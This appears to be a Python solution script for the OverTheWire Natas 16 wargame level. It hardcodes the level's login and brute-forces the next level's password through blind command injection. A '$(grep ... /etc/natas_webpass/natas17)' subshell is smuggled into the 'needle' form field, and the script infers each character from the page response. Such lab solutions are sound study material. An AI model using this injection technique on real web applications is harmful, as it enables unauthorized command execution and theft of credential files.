import requests

url = "http://natas16.natas.labs.overthewire.org/"
auth=("natas16","hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
           'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
           '0','1','2','3','4','5','6','7','8','9']
password = ""
for n in range(32):
    for i in characters:
            payload="africans$(grep -E ^.{"+str(n)+"}"+i+" /etc/natas_webpass/natas17)"
            user_search={"needle" : payload}
            response = requests.post(url,data=user_search,auth=auth)
            if "Africans" not in response.text:
                password += i
                print(password)
                break